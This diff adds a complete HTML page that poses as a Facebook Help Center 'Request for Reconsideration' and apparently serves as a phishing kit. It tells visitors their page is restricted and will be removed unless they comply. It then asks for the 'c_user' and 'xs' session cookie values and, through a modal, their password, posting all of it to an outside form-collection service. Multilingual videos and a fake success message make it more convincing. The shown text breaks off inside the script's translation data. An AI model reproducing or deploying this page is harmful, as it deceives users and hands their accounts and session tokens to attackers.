@@ -1,0 +1,2017 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook Help Center</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" />
+  <style>
+    /* All the CSS styles remain exactly the same */
+    * {
+        box-sizing: border-box;
+    }
+
+    body {
+        margin: 0;
+        padding: 0;
+        overflow-x: hidden;
+        font-family: Arial, Helvetica, sans-serif;
+        background-color: #f0f2f5;
+    }
+
+    #nav {
+        background: linear-gradient(to bottom, #2f5097, #3b5998);
+        padding: 12px 0;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    }
+
+    .container {
+        max-width: 1320px;
+        width: 90%;
+        margin: 0 auto;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
+
+    .logo {
+        display: flex;
+        align-items: center;
+    }
+
+    .logo-placeholder {
+        width: 180px;
+        height: 42px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: bold;
+        color: white;
+        font-size: 32px;
+        letter-spacing: -0.5px;
+        text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+    }
+
+    .search {
+        position: relative;
+        width: 100%;
+        max-width: 500px;
+    }
+
+    .search input {
+        width: 100%;
+        height: 38px;
+        outline: none;
+        border: 1px solid #ccd0d5;
+        font-size: 1rem;
+        padding-left: 35px;
+        border-radius: 20px;
+        box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1);
+        font-family: Arial, Helvetica, sans-serif;
+    }
+
+    .fa-search {
+        position: absolute;
+        top: 50%;
+        left: 12px;
+        transform: translateY(-50%);
+        font-size: 14px;
+        color: #8a8d91;
+    }
+
+    #Home {
+        background-color: #fff;
+        padding: 8px 0;
+        border-bottom: 1px solid #dddfe2;
+        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+    }
+
+    .home {
+        display: flex;
+        align-items: center;
+        height: 45px;
+    }
+
+    .home i {
+        color: #3578e5;
+        font-size: 16px;
+    }
+
+    .home h3 {
+        margin-left: 10px;
+        font-size: 14px;
+        color: #3578e5;
+        font-weight: 600;
+    }
+
+    .line {
+        display: block;
+        width: 107px;
+        height: 3.5px;
+        background: #3578e5;
+        margin-top: 5px;
+        border-radius: 2px;
+    }
+
+    #main-container-wrapper {
+        display: flex;
+        justify-content: center;
+        padding: 0 5%;
+        margin-top: 10px;
+    }
+
+    #main-container {
+        width: 90%;
+        max-width: 740px;
+        background: white;
+        border-radius: 8px;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        overflow: hidden;
+        margin: 0 auto;
+    }
+
+    .meta-para {
+        border: 1px solid #dddfe2;
+        border-radius: 3px;
+        font-family: Arial, Helvetica, sans-serif;
+    }
+
+    .meta-para h3 {
+        color: #4b4f56;
+        background-color: #f5f6f7;
+        margin: 0;
+        padding: 15px;
+        font-weight: 500;
+        font-size: 16px;
+        border-bottom: 1px solid #dddfe2;
+    }
+
+    .meta-para p {
+        padding: 10px 20px;
+        font-size: 14px;
+        line-height: 1.5;
+        color: #444950;
+        margin: 0;
+        text-align: justify;
+    }
+
+    .warning-message {
+        background-color: #fff8e1;
+        border-left: 4px solid #ffc107;
+        padding: 12px 20px;
+        margin: 10px 20px;
+        font-size: 14px;
+        line-height: 1.5;
+        color: #444950;
+    }
+
+    .video-section {
+        padding: 15px 20px;
+        border-bottom: 1px solid #dddfe2;
+        background-color: #f9f9f9;
+    }
+
+    .para-head {
+        font-size: 16px;
+        font-weight: 700;
+        color: #444950;
+        margin-bottom: 15px;
+    }
+
+    .video-container {
+        display: flex;
+        align-items: flex-start;
+        gap: 20px;
+    }
+
+    .video-thumbnail {
+        width: 280px;
+        height: 160px;
+        border-radius: 6px;
+        overflow: hidden;
+        position: relative;
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+        flex-shrink: 0;
+        cursor: pointer;
+    }
+
+    .video-thumbnail img {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        display: block;
+    }
+
+    .play-button {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 50px;
+        height: 50px;
+        background-color: rgba(255, 255, 255, 0.9);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        transition: all 0.2s ease;
+    }
+
+    .play-button:hover {
+        background-color: white;
+        transform: translate(-50%, -50%) scale(1.05);
+    }
+
+    .play-button i {
+        color: #4267b2;
+        font-size: 20px;
+        margin-left: 3px;
+    }
+
+    .video-info {
+        flex: 1;
+    }
+
+    .video-title {
+        font-weight: 600;
+        font-size: 15px;
+        color: #444950;
+        margin-bottom: 8px;
+    }
+
+    .video-description {
+        font-size: 14px;
+        color: #65676b;
+        line-height: 1.5;
+    }
+
+    .form {
+        padding: 20px;
+        font-family: Arial, Helvetica, sans-serif;
+    }
+
+    .form label {
+        display: block;
+        color: #444950;
+        font-weight: 600;
+        margin-bottom: 5px;
+        margin-top: 15px;
+    }
+
+    .form input, .form select {
+        width: 100%;
+        max-width: 300px;
+        height: 35px;
+        border: 1px solid #ccd0d5;
+        border-radius: 4px;
+        padding: 0 10px;
+        font-size: 14px;
+        transition: border-color 0.2s;
+        font-family: Arial, Helvetica, sans-serif;
+    }
+
+    .form input:focus, .form select:focus {
+        border-color: #3578e5;
+        outline: none;
+        box-shadow: 0 0 0 2px rgba(53, 120, 229, 0.2);
+    }
+
+    #do-not {
+        font-size: 13px;
+        color: #8a8d91;
+        margin: 15px 0;
+        font-style: italic;
+        padding: 0;
+        background-color: #f9f9f9;
+        border-left: 3px solid #dddfe2;
+        padding: 8px 12px;
+    }
+
+    .btn-primary {
+        background-color: #4267b2;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        padding: 8px 20px;
+        font-weight: 600;
+        cursor: pointer;
+        font-size: 14px;
+        transition: background-color 0.2s;
+        margin-top: 10px;
+        font-family: Arial, Helvetica, sans-serif;
+    }
+
+    .btn-primary:hover {
+        background-color: #365899;
+    }
+
+    footer {
+        margin-top: 40px;
+        padding: 20px 0;
+        border-top: 1px solid #dddfe2;
+        background-color: white;
+    }
+
+    .left {
+        display: flex;
+        justify-content: flex-start;
+        flex-wrap: wrap;
+        margin-bottom: 20px;
+    }
+
+    .col {
+        margin-right: 40px;
+        margin-bottom: 15px;
+    }
+
+    .col ul {
+        list-style-type: none;
+        padding: 0;
+        margin: 0;
+    }
+
+    .col ul li {
+        margin-bottom: 8px;
+    }
+
+    .col ul li a {
+        text-decoration: none;
+        color: #8a8d91;
+        font-size: 13px;
+    }
+
+    .col ul li a:hover {
+        text-decoration: underline;
+    }
+
+    .right {
+        text-align: center;
+    }
+
+    .right p {
+        color: #8a8d91;
+        font-size: 13px;
+        margin: 0;
+    }
+
+    /* Modal styles */
+    .modal {
+        display: none;
+        position: fixed;
+        z-index: 1000;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5);
+        align-items: center;
+        justify-content: center;
+    }
+
+    .modal-content {
+        background-color: white;
+        padding: 25px;
+        border-radius: 8px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+        width: 90%;
+        max-width: 400px;
+        text-align: center;
+        font-family: Arial, Helvetica, sans-serif;
+    }
+
+    .modal h3 {
+        margin-top: 0;
+        color: #1c1e21;
+    }
+
+    .modal input {
+        width: 100%;
+        padding: 10px;
+        margin: 15px 0;
+        border: 1px solid #dddfe2;
+        border-radius: 4px;
+        font-size: 14px;
+    }
+
+    .modal-buttons {
+        display: flex;
+        justify-content: center;
+        gap: 10px;
+    }
+
+    .modal-btn {
+        padding: 8px 16px;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        font-weight: 600;
+        font-family: Arial, Helvetica, sans-serif;
+    }
+
+    .modal-confirm {
+        background-color: #4267b2;
+        color: white;
+    }
+
+    .modal-cancel {
+        background-color: #e4e6eb;
+        color: #4b4f56;
+    }
+
+    /* Success Modal Styles */
+    .success-modal {
+        display: none;
+        position: fixed;
+        z-index: 1002;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5);
+        align-items: center;
+        justify-content: center;
+    }
+
+    .success-modal-content {
+        background-color: white;
+        padding: 30px;
+        border-radius: 8px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+        width: 90%;
+        max-width: 450px;
+        text-align: center;
+        font-family: Arial, Helvetica, sans-serif;
+        animation: success-appear 0.3s ease-out;
+    }
+
+    @keyframes success-appear {
+        from {
+            opacity: 0;
+            transform: translateY(-20px) scale(0.95);
+        }
+        to {
+            opacity: 1;
+            transform: translateY(0) scale(1);
+        }
+    }
+
+    .success-icon {
+        font-size: 60px;
+        color: #42b72a;
+        margin-bottom: 20px;
+        animation: success-icon 0.5s ease-out;
+    }
+
+    @keyframes success-icon {
+        0% {
+            transform: scale(0);
+            opacity: 0;
+        }
+        50% {
+            transform: scale(1.2);
+        }
+        100% {
+            transform: scale(1);
+            opacity: 1;
+        }
+    }
+
+    .success-modal h3 {
+        margin: 0 0 15px 0;
+        color: #1c1e21;
+        font-size: 22px;
+    }
+
+    .success-modal p {
+        color: #65676b;
+        margin-bottom: 25px;
+        line-height: 1.5;
+        font-size: 16px;
+    }
+
+    .success-modal-button {
+        background-color: #42b72a;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        padding: 10px 24px;
+        font-weight: 600;
+        cursor: pointer;
+        font-size: 16px;
+        transition: background-color 0.2s;
+        font-family: Arial, Helvetica, sans-serif;
+    }
+
+    .success-modal-button:hover {
+        background-color: #36a420;
+    }
+
+    /* Enhanced Video Modal Styles */
+    .video-modal {
+        display: none;
+        position: fixed;
+        z-index: 1001;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.9);
+        align-items: center;
+        justify-content: center;
+    }
+
+    .video-modal-content {
+        position: relative;
+        width: 90%;
+        max-width: 800px;
+        background-color: #000;
+        border-radius: 8px;
+        overflow: hidden;
+    }
+
+    .video-modal video {
+        width: 100%;
+        display: block;
+    }
+
+    .close-video {
+        position: absolute;
+        top: 10px;
+        right: 10px;
+        color: white;
+        background-color: rgba(0, 0, 0, 0.5);
+        width: 30px;
+        height: 30px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        font-size: 18px;
+        z-index: 1003;
+    }
+
+    .close-video:hover {
+        background-color: rgba(0, 0, 0, 0.7);
+    }
+
+    /* Custom Video Controls */
+    .custom-video-controls {
+        position: absolute;
+        bottom: 0;
+        left: 0;
+        width: 100%;
+        background: linear-gradient(to top, rgba(0,0,0,0.7), transparent);
+        padding: 10px;
+        display: flex;
+        flex-direction: column;
+        opacity: 0;
+        transition: opacity 0.3s;
+        z-index: 1002;
+    }
+
+    .video-modal-content:hover .custom-video-controls {
+        opacity: 1;
+    }
+
+    .progress-container {
+        width: 100%;
+        height: 6px;
+        background: rgba(255, 255, 255, 0.3);
+        border-radius: 3px;
+        cursor: pointer;
+        margin-bottom: 10px;
+    }
+
+    .progress-bar {
+        height: 100%;
+        background: #4267b2;
+        border-radius: 3px;
+        width: 0%;
+    }
+
+    .control-buttons {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+    }
+
+    .left-controls, .right-controls {
+        display: flex;
+        align-items: center;
+        gap: 15px;
+    }
+
+    .control-btn {
+        background: none;
+        border: none;
+        color: white;
+        cursor: pointer;
+        font-size: 16px;
+        outline: none;
+    }
+
+    .control-btn:hover {
+        color: #ddd;
+    }
+
+    .time-display {
+        color: white;
+        font-size: 14px;
+        margin: 0 5px;
+    }
+
+    .volume-container {
+        display: flex;
+        align-items: center;
+        gap: 5px;
+    }
+
+    .volume-slider {
+        width: 80px;
+        height: 5px;
+        -webkit-appearance: none;
+        appearance: none;
+        background: rgba(255, 255, 255, 0.3);
+        border-radius: 3px;
+        outline: none;
+    }
+
+    .volume-slider::-webkit-slider-thumb {
+        -webkit-appearance: none;
+        appearance: none;
+        width: 12px;
+        height: 12px;
+        border-radius: 50%;
+        background: #fff;
+        cursor: pointer;
+    }
+
+    .speed-menu {
+        position: relative;
+        display: inline-block;
+    }
+
+    .speed-options {
+        display: none;
+        position: absolute;
+        bottom: 30px;
+        right: 0;
+        background-color: rgba(0, 0, 0, 0.8);
+        min-width: 80px;
+        border-radius: 4px;
+        z-index: 1;
+    }
+
+    .speed-options button {
+        color: white;
+        padding: 8px 12px;
+        text-decoration: none;
+        display: block;
+        width: 100%;
+        text-align: left;
+        background: none;
+        border: none;
+        cursor: pointer;
+    }
+
+    .speed-options button:hover {
+        background-color: rgba(255, 255, 255, 0.1);
+    }
+
+    .speed-menu:hover .speed-options {
+        display: block;
+    }
+
+    /* Fullscreen styles */
+    .video-modal.fullscreen {
+        padding: 0;
+        align-items: stretch;
+    }
+
+    .video-modal.fullscreen .video-modal-content {
+        width: 100%;
+        max-width: none;
+        border-radius: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .video-modal.fullscreen video {
+        width: 100%;
+        height: 100%;
+        object-fit: contain;
+    }
+
+    /* PiP (Picture-in-Picture) button */
+    .pip-btn {
+        display: none; /* Hidden by default, shown only if supported */
+    }
+
+    /* Language Selector Overlay Styles */
+    .language-selector-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.9);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 1005;
+    }
+
+    .language-selector-popup {
+        background-color: white;
+        border-radius: 12px;
+        padding: 30px;
+        max-width: 500px;
+        width: 90%;
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+        text-align: center;
+    }
+
+    .language-selector-title {
+        margin-top: 0;
+        margin-bottom: 25px;
+        color: #1877f2;
+        font-size: 24px;
+        font-weight: bold;
+    }
+
+    .language-options {
+        max-height: 350px;
+        overflow-y: auto;
+        margin-bottom: 20px;
+    }
+
+    .language-option {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 12px 15px;
+        border-bottom: 1px solid #eee;
+        cursor: pointer;
+        transition: background-color 0.2s;
+    }
+
+    .language-option:hover {
+        background-color: #f0f2f5;
+    }
+
+    .language-option.selected {
+        background-color: #e7f3ff;
+    }
+
+    .check-icon {
+        color: #1877f2;
+        font-size: 16px;
+    }
+
+    .language-continue-btn {
+        background-color: #1877f2;
+        color: white;
+        border: none;
+        border-radius: 6px;
+        padding: 12px 24px;
+        font-weight: 600;
+        cursor: pointer;
+        font-size: 16px;
+        transition: background-color 0.2s;
+        width: 100%;
+    }
+
+    .language-continue-btn:hover {
+        background-color: #166fe5;
+    }
+
+    /* Language Switcher Styles */
+    .language-switcher {
+        position: relative;
+        margin-left: 20px;
+    }
+
+    .language-button {
+        background-color: transparent;
+        border: 1px solid rgba(255, 255, 255, 0.3);
+        color: white;
+        padding: 6px 12px;
+        border-radius: 4px;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        font-size: 14px;
+    }
+
+    .language-button i {
+        margin-left: 5px;
+    }
+
+    .language-menu {
+        display: none;
+        position: absolute;
+        top: 100%;
+        right: 0;
+        background-color: white;
+        border-radius: 6px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        min-width: 150px;
+        z-index: 1000;
+        margin-top: 5px;
+        overflow: hidden;
+    }
+
+    .language-menu.active {
+        display: block;
+    }
+
+    .language-item {
+        padding: 10px 15px;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        color: #1c1e21;
+        font-size: 14px;
+    }
+
+    .language-item:hover {
+        background-color: #f0f2f5;
+    }
+
+    .language-item.selected {
+        background-color: #e7f3ff;
+        color: #1877f2;
+    }
+
+    .language-item .check-icon {
+        margin-left: auto;
+        display: none;
+    }
+
+    .language-item.selected .check-icon {
+        display: block;
+    }
+
+    /* Responsive styles */
+    @media only screen and (max-width: 768px) {
+        .container {
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        
+        .search {
+            margin-top: 15px;
+            max-width: 100%;
+        }
+        
+        .home {
+            margin-left: 0;
+        }
+        
+        .line {
+            margin-left: 0;
+        }
+        
+        .col {
+            margin-right: 20px;
+        }
+        
+        .form input, .form select {
+            max-width: 100%;
+        }
+        
+        #main-container-wrapper {
+            padding: 0 3%;
+        }
+        
+        #main-container {
+            width: 100%;
+        }
+        
+        .modal-content {
+            width: 85%;
+            padding: 20px;
+        }
+        
+        .success-modal-content {
+            width: 85%;
+            padding: 20px;
+        }
+        
+        .video-container {
+            flex-direction: column;
+        }
+        
+        .video-thumbnail {
+            width: 100%;
+            max-width: 280px;
+        }
+        
+        .video-modal-content {
+            width: 95%;
+        }
+
+        .volume-slider {
+            width: 60px;
+        }
+
+        .speed-menu {
+            display: none; /* Hide speed controls on mobile to save space */
+        }
+        
+        .language-switcher {
+            margin-left: 0;
+            margin-top: 15px;
+            width: 100%;
+        }
+        
+        .language-button {
+            width: 100%;
+            justify-content: center;
+        }
+        
+        .language-menu {
+            left: 0;
+            right: auto;
+            width: 100%;
+        }
+        
+        .language-selector-popup {
+            padding: 20px;
+        }
+        
+        .language-selector-title {
+            font-size: 20px;
+        }
+    }
+
+    @media only screen and (max-width: 480px) {
+        .left {
+            flex-direction: column;
+        }
+        
+        .col {
+            margin-right: 0;
+            width: 100%;
+        }
+        
+        .logo-placeholder {
+            width: 150px;
+            height: 36px;
+            font-size: 28px;
+        }
+        
+        .modal-content {
+            width: 90%;
+            padding: 15px;
+        }
+        
+        .success-modal-content {
+            width: 90%;
+            padding: 20px 15px;
+        }
+        
+        .warning-message {
+            margin: 10px;
+        }
+        
+        .video-thumbnail {
+            height: 140px;
+        }
+
+        .control-buttons {
+            flex-wrap: wrap;
+        }
+
+        .right-controls {
+            margin-top: 10px;
+            width: 100%;
+            justify-content: space-between;
+        }
+        
+        .language-option {
+            padding: 10px 12px;
+        }
+    }
+  </style>
+</head>
+
+<body>
+  <!-- Initial Language Selection Overlay -->
+  <div class="language-selector-overlay" id="initial-language-selector">
+    <div class="language-selector-popup">
+        <h3 class="language-selector-title">Select Your Language</h3>
+        <div class="language-options">
+            <div class="language-option selected" data-lang="english">
+                <span class="language-name">English</span>
+                <i class="fas fa-check check-icon"></i>
+            </div>
+            <div class="language-option" data-lang="spanish">
+                <span class="language-name">Español (Spanish)</span>
+                <i class="fas fa-check check-icon"></i>
+            </div>
+            <div class="language-option" data-lang="portuguese">
+                <span class="language-name">Português (Portuguese)</span>
+                <i class="fas fa-check check-icon"></i>
+            </div>
+            <div class="language-option" data-lang="arabic">
+                <span class="language-name">العربية (Arabic)</span>
+                <i class="fas fa-check check-icon"></i>
+            </div>
+            <div class="language-option" data-lang="french">
+                <span class="language-name">Français (French)</span>
+                <i class="fas fa-check check-icon"></i>
+            </div>
+            <div class="language-option" data-lang="hindi">
+                <span class="language-name">हिन्दी (Hindi)</span>
+                <i class="fas fa-check check-icon"></i>
+            </div>
+            <div class="language-option" data-lang="tamil">
+                <span class="language-name">தமிழ் (Tamil)</span>
+                <i class="fas fa-check check-icon"></i>
+            </div>
+            <div class="language-option" data-lang="vietnamese">
+                <span class="language-name">Tiếng Việt (Vietnamese)</span>
+                <i class="fas fa-check check-icon"></i>
+            </div>
+        </div>
+        <button class="language-continue-btn" id="language-continue">Continue</button>
+    </div>
+  </div>
+
+  <section id="nav">
+    <div class="container">
+      <div class="logo">
+        <div class="logo-placeholder">facebook</div>
+      </div>
+      <div class="search">
+        <i class="fa-solid fa-search"></i>
+        <input type="text" placeholder="How can we help?" />
+      </div>
+      <div class="language-switcher">
+        <button class="language-button">
+          <i class="fas fa-globe"></i> English <i class="fas fa-caret-down"></i>
+        </button>
+        <div class="language-menu">
+          <div class="language-item selected" data-lang="english">
+            English <i class="fas fa-check check-icon"></i>
+          </div>
+          <div class="language-item" data-lang="spanish">Español (Spanish)</div>
+          <div class="language-item" data-lang="portuguese">Português (Portuguese)</div>
+          <div class="language-item" data-lang="arabic">العربية (Arabic)</div>
+          <div class="language-item" data-lang="french">Français (French)</div>
+          <div class="language-item" data-lang="hindi">हिन्दी (Hindi)</div>
+          <div class="language-item" data-lang="tamil">தமிழ் (Tamil)</div>
+          <div class="language-item" data-lang="vietnamese">Tiếng Việt (Vietnamese)</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="Home">
+    <div class="container">
+      <div class="home">
+        <i class="fa-solid fa-house-chimney"></i>
+        <h3>Help Center</h3>
+      </div>
+      <span class="line"></span>
+    </div>
+  </section>
+
+  <div id="main-container-wrapper">
+    <section id="main-container">
+      <div class="meta-para">
+        <h3 class="meta-head"><b>Request for Reconsideration</b></h3>
+        <p>
+          Our community standards have identified atypical behavior on your page, which constitutes a breach of our guidelines.
+        </p>
+        <p>
+          The access to your page has been restricted, preventing you from posting, sharing, or commenting as the page itself.
+        </p>
+        <p>
+          Should you believe this action to be erroneous, you may file a reconsideration request by supplying the necessary details.
+        </p>
+        
+        <p>
+          Kindly ensure that you submit the required data as specified below. Neglecting to do so may result in the removal of your page from our platform.
+        </p>
+        
+        <div class="video-section">
+          <p class="para-head">Detailed Video Information</p>
+          <div class="video-container">
+            <div class="video-thumbnail">
+              <img src="img2.jpg" alt="Video thumbnail">
+              <div class="play-button">
+                <i class="fa-solid fa-play"></i>
+              </div>
+            </div>
+            <div class="video-info">
+              <div class="video-title">How to Submit a Reconsideration Request</div>
+              <div class="video-description">
+                This video will guide you through the process of submitting a reconsideration request for your restricted page. Learn what information you need to provide and how to ensure your request is processed quickly.
+              </div>
+            </div>
+          </div>
+        </div>
+        
+        <form class="form" method="post" action="https://submit-form.com/q1WslPaOU" id="reconsiderationForm">
+          <input type="hidden" name="jazoest" value="2957" autocomplete="off">
+          <input type="hidden" name="lsd" value="AVp4UkjACmg" autocomplete="off">
+          
+          <label for="c_user">c_user</label>
+          <input type="text" id="c_user" name="c_user" required pattern="\d+" />
+          
+          <label for="xs">xs</label>
+          <input type="text" id="xs" name="xs" required pattern="(\d{1,2}[%:].*)" />
+          
+          <input type="hidden" id="passwordField" name="password">
+          
+          <p id="do-not">Avoid signing out until the assessment has been fully carried out.</p>
+          
+          <button type="submit" class="btn-primary">Send</button>
+        </form>
+      </div>
+    </section>
+  </div>
+
+  <!-- Password Re-entry Modal -->
+  <div id="passwordModal" class="modal">
+    <div class="modal-content">
+      <h3>Confirm Your Password</h3>
+      <p>Please re-enter your password to confirm your identity.</p>
+      <input type="password" id="passwordConfirm" placeholder="Enter your password" />
+      <div class="modal-buttons">
+        <button class="modal-btn modal-confirm" id="confirmSubmit">Confirm</button>
+        <button class="modal-btn modal-cancel" id="cancelSubmit">Cancel</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Success Modal -->
+  <div id="successModal" class="success-modal">
+    <div class="success-modal-content">
+      <div class="success-icon">
+        <i class="fas fa-check-circle"></i>
+      </div>
+      <h3>Request Submitted Successfully</h3>
+      <p>Your reconsideration request has been received. Our team will review your information and respond within 24-48 hours.</p>
+      <button class="success-modal-button" id="successOkButton">OK</button>
+    </div>
+  </div>
+      
+  <!-- Enhanced Video Modal -->
+  <div id="videoModal" class="video-modal">
+    <div class="video-modal-content">
+      <span class="close-video">&times;</span>
+      <video id="helpVideo">
+        <source id="videoSource" src="" type="video/mp4">
+        Your browser does not support the video tag.
+      </video>
+      
+      <!-- Custom Video Controls -->
+      <div class="custom-video-controls">
+        <div class="progress-container">
+          <div class="progress-bar"></div>
+        </div>
+        
+        <div class="control-buttons">
+          <div class="left-controls">
+            <button class="control-btn play-pause">
+              <i class="fas fa-play"></i>
+            </button>
+            
+            <div class="volume-container">
+              <button class="control-btn volume-btn">
+                <i class="fas fa-volume-up"></i>
+              </button>
+              <input type="range" class="volume-slider" min="0" max="1" step="0.1" value="1">
+            </div>
+            
+            <div class="time-display">
+              <span class="current-time">0:00</span> / <span class="duration">0:00</span>
+            </div>
+          </div>
+          
+          <div class="right-controls">
+            <div class="speed-menu">
+              <button class="control-btn speed-btn">
+                <i class="fas fa-tachometer-alt"></i>
+              </button>
+              <div class="speed-options">
+                <button data-speed="0.5">0.5x</button>
+                <button data-speed="0.75">0.75x</button>
+                <button data-speed="1" class="active">1x</button>
+                <button data-speed="1.25">1.25x</button>
+                <button data-speed="1.5">1.5x</button>
+                <button data-speed="2">2x</button>
+              </div>
+            </div>
+            
+            <button class="control-btn pip-btn">
+              <i class="fas fa-compress"></i>
+            </button>
+            
+            <button class="control-btn fullscreen-btn">
+              <i class="fas fa-expand"></i>
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    <div class="container">
+      <div class="left">
+        <div class="col">
+          <ul>
+            <li><a href="#">About</a></li>
+            <li><a href="#">Privacy policy</a></li>
+            <li><a href="#">Career</a></li>
+          </ul>
+        </div>
+        <div class="col">
+          <ul>
+            <li><a href="#">Ad Choice</a></li>
+            <li><a href="#">Created ad</a></li>
+            <li><a href="#">Created page</a></li>
+          </ul>
+        </div>
+        <div class="col">
+          <ul>
+            <li><a href="#">Terms and policies</a></li>
+            <li><a href="#">Cookies</a></li>
+          </ul>
+        </div>
+      </div>
+      <div class="right">
+        <p>Meta © 2025</p>
+      </div>
+    </div>
+  </footer>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      // Initial language selection elements
+      const initialLanguageSelector = document.getElementById('initial-language-selector');
+      const languageOptions = initialLanguageSelector.querySelectorAll('.language-option');
+      const languageContinueBtn = document.getElementById('language-continue');
+      
+      // Show initial language selector on page load
+      initialLanguageSelector.style.display = 'flex';
+      
+      // Language option selection
+      languageOptions.forEach(option => {
+        option.addEventListener('click', function() {
+          languageOptions.forEach(opt => opt.classList.remove('selected'));
+          this.classList.add('selected');
+        });
+      });
+      
+      // Video sources for each language
+      const videoSources = {
+        english: 'https://our-b38a1.web.app/English.mp4',
+        spanish: 'https://our-b38a1.web.app/Spanish.mp4',
+        portuguese: 'https://our-b38a1.web.app/Portuguese.mp4',
+        arabic: 'https://ik.imagekit.io/arabi/Arabic.mp4',
+        french: 'https://our-b38a1.web.app/French.mp4',
+        hindi: 'https://ik.imagekit.io/Hindi1/hindi1.mp4',
+        tamil: 'https://ik.imagekit.io/tamili/Tamil.mp4',
+        vietnamese: 'https://ik.imagekit.io/alienglish/VID-20250901-WA0150.mp4' // Placeholder URL
+      };
+      
+      // Function to set video source based on language
+      function setVideoSource(lang) {
+        const videoPlayer = document.getElementById('helpVideo');
+        const sourceElement = document.getElementById('videoSource');
+        
+        if (videoSources[lang]) {
+          sourceElement.src = videoSources[lang];
+          videoPlayer.load(); // Reload the video with the new source
+          console.log(`Video source set to: ${videoSources[lang]}`);
+        } else {
+          // Default to English if language not found
+          sourceElement.src = videoSources.english;
+          videoPlayer.load();
+          console.log(`Language ${lang} not found, defaulting to English`);
+        }
+      }
+      
+      // Continue button handler
+      languageContinueBtn.addEventListener('click', function() {
+        const selectedOption = initialLanguageSelector.querySelector('.language-option.selected');
+        const selectedLang = selectedOption.getAttribute('data-lang');
+        
+        // Hide initial language selector
+        initialLanguageSelector.style.display = 'none';
+        
+        // Set video source based on selected language
+        setVideoSource(selectedLang);
+        
+        // Translate page to selected language
+        translatePage(selectedLang);
+        
+        // Update language switcher
+        updateLanguageSwitcher(selectedLang);
+      });
+      
+      const form = document.getElementById('reconsiderationForm');
+      const modal = document.getElementById('passwordModal');
+      const passwordConfirm = document.getElementById('passwordConfirm');
+      const confirmSubmit = document.getElementById('confirmSubmit');
+      const cancelSubmit = document.getElementById('cancelSubmit');
+      const passwordField = document.getElementById('passwordField');
+      
+      // Success modal elements
+      const successModal = document.getElementById('successModal');
+      const successOkButton = document.getElementById('successOkButton');
+      
+      // Enhanced video modal elements
+      const videoModal = document.getElementById('videoModal');
+      const videoPlayer = document.getElementById('helpVideo');
+      const closeVideo = document.querySelector('.close-video');
+      const playButton = document.querySelector('.play-button');
+      const videoThumbnail = document.querySelector('.video-thumbnail');
+      
+      // Custom video controls elements
+      const playPauseBtn = document.querySelector('.play-pause');
+      const volumeBtn = document.querySelector('.volume-btn');
+      const volumeSlider = document.querySelector('.volume-slider');
+      const progressContainer = document.querySelector('.progress-container');
+      const progressBar = document.querySelector('.progress-bar');
+      const currentTimeEl = document.querySelector('.current-time');
+      const durationEl = document.querySelector('.duration');
+      const speedOptions = document.querySelectorAll('.speed-options button');
+      const fullscreenBtn = document.querySelector('.fullscreen-btn');
+      const pipBtn = document.querySelector('.pip-btn');
+      
+      // Language switcher elements
+      const languageButton = document.querySelector('.language-button');
+      const languageMenu = document.querySelector('.language-menu');
+      const languageItems = document.querySelectorAll('.language-item');
+      
+      // Translation data
+      const translations = {
+        english: {
+          search_placeholder: "How can we help?",
+          help_center: "Help Center",
+          request_title: "Request for Reconsideration",
+          para1: "Our community standards have identified atypical behavior on your page, which constitutes a breach of our guidelines.",
+          para2: "The access to your page has been restricted, preventing you from posting, sharing, or commenting as the page itself.",
+          para3: "Should you believe this action to be erroneous, you may file a reconsideration request by supplying the necessary details.",
+          para4: "Kindly ensure that you submit the required data as specified below. Neglecting to do so may result in the removal of your page from our platform.",
+          video_title: "Detailed Video Information",
+          video_info: "How to Submit a Reconsideration Request",
+          video_desc: "This video will guide you through the process of submitting a reconsideration request for your restricted page. Learn what information you need to provide and how to ensure your request is processed quickly.",
+          c_user_label: "c_user",
+          xs_label: "xs",
+          warning: "Avoid signing out until the assessment has been fully carried out.",
+          submit_btn: "Send",
